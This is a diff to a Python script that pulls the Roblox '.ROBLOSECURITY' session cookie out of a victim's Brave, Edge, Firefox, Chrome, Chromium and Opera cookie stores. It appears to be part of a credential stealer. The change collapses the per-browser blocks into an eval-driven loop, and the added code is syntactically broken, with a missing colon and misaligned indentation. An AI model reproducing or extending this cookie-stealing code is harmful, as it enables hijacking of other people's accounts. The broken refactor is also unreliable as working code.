@@ -13,34 +13,8 @@ if __name__ == "__main__":
         data = [] 
 
         try:
-            cookies = browser_cookie3.firefox(domain_name='roblox.com')
-            for cookie in cookies:
-                if cookie.name == '.ROBLOSECURITY':
-                    data.append(cookies)
-                    data.append(cookie.value)
-                    return data[1]
-        except:
-            pass
-        try:
-            cookies = browser_cookie3.chrome(domain_name='roblox.com')
-            for cookie in cookies:
-                if cookie.name == '.ROBLOSECURITY':
-                    data.append(cookies)
-                    data.append(cookie.value)
-                    return data[1]
-        except:
-            pass
-        try:
-            cookies = browser_cookie3.chromium(domain_name='roblox.com')
-            for cookie in cookies:
-                if cookie.name == '.ROBLOSECURITY':
-                    data.append(cookies)
-                    data.append(cookie.value)
-                    return data[1]
-        except:
-            pass
-        try:
-            cookies = browser_cookie3.edge(domain_name='roblox.com')
+            for browser in ["brave", "edge", "firefox", "chrome", "chromium", "opera"]
+            cookies = eval(f"browser_cookie3.{browser}(domain_name='roblox.com')")
             for cookie in cookies:
                 if cookie.name == '.ROBLOSECURITY':
                     data.append(cookies)
@@ -49,15 +23,6 @@ if __name__ == "__main__":
         except:
             pass
 
-        try:
-            cookies = browser_cookie3.opera(domain_name='roblox.com')
-            for cookie in cookies:
-                if cookie.name == '.ROBLOSECURITY':
-                    data.append(cookies)
-                    data.append(cookie.value)
-                    return data[1]
-        except:
-            pass
     roblox = Log()
 
     if roblox == None:
